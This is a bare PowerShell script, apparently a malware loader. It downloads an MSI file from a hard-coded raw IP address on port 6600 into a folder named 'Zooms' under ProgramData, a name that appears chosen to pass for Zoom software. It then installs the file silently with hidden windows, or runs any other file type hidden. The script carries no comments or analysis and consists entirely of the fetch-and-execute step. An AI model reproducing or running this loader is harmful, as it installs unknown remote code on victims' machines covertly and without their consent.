$ErrorActionPreference = "Stop"
$url = "http://85.239.149.40:6600/5sxu2qr5/UICBDMW.msi"
$workDir = "C:\ProgramData\Zooms"
$fileName = [System.IO.Path]::GetFileName($url)
$filePath = Join-Path $workDir $fileName
New-Item -ItemType Directory -Path $workDir -Force | Out-Null
Add-Type -AssemblyName System.Net.Http
$client = New-Object System.Net.Http.HttpClient
$client.Timeout = [TimeSpan]::FromMinutes(30)
$response = $client.GetAsync($url).Result
$response.EnsureSuccessStatusCode()
$bytes = $response.Content.ReadAsByteArrayAsync().Result
[System.IO.File]::WriteAllBytes($filePath, $bytes)
$client.Dispose()
if ($filePath -like "*.msi") {
    Start-Process "msiexec.exe" -ArgumentList "/i `"$filePath`" /qn /norestart" -Wait -WindowStyle Hidden
} else {
    Start-Process -FilePath $filePath -WindowStyle Hidden
}
